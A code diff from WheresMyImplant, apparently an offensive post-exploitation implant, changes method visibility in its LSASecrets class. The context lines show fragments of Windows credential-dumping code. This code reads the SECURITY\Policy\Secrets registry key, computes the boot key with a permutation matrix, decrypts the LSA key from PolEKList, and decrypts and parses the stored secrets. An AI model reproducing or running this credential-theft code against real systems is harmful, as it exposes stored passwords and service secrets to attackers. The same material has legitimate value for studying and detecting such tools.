@@ -11,16 +11,16 @@ namespace WheresMyImplant
 {
     class LSASecrets : Base
     {
-        public Boolean bailOut = false;
+        internal Boolean bailOut = false;
 
-        public LSASecrets()
+        internal LSASecrets()
         {
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public void DumpLSASecrets()
+        internal void DumpLSASecrets()
         {
             WriteOutputNeutral("Reading Secrets Key: SECURITY\\Policy\\Secrets");
             String[] secretSubKeys = Registry.LocalMachine.OpenSubKey(@"SECURITY\Policy\Secrets").GetSubKeyNames();
@@ -67,7 +67,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public static String ParseDecrypted(Byte[] decryptedString)
+        internal static String ParseDecrypted(Byte[] decryptedString)
         {
             Console.WriteLine((Int32)decryptedString[0]);
             Byte[] passwordText = decryptedString.Skip(16).Take((Int32)decryptedString[0]).ToArray();
@@ -85,7 +85,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //https://social.msdn.microsoft.com/Forums/vstudio/en-US/d490653d-479c-4a40-90ff-76870309c801/remove-nonprintable-characters-from-a-string?forum=csharpgeneral
         ////////////////////////////////////////////////////////////////////////////////
-        public static String RemoveNonPrintableCharacters(String s)
+        internal static String RemoveNonPrintableCharacters(String s)
         {
             StringBuilder result = new StringBuilder();
             for (Int32 i = 0; i < s.Length; i++)
@@ -105,7 +105,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public static Byte[] DecryptLsa(Byte[] secret, Byte[] key)
+        internal static Byte[] DecryptLsa(Byte[] secret, Byte[] key)
         {
             Byte[] combinedKey = key;
             Byte[] splicedSecret = secret.Skip(28).Take(32).ToArray();
@@ -139,7 +139,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public static Byte[] GetLsaKey(Byte[] bootKey)
+        internal static Byte[] GetLsaKey(Byte[] bootKey)
         {
             Byte[] polEKList = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SECURITY\Policy\PolEKList", "");
             Byte[] lsaKey = LSASecrets.DecryptLsa(polEKList, bootKey);
@@ -150,7 +150,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        public static Byte[] GetBootKey()
+        internal static Byte[] GetBootKey()
         {
             //Int32[] permutationMatrix = { 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 };
             Int32[] permutationMatrix = { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };
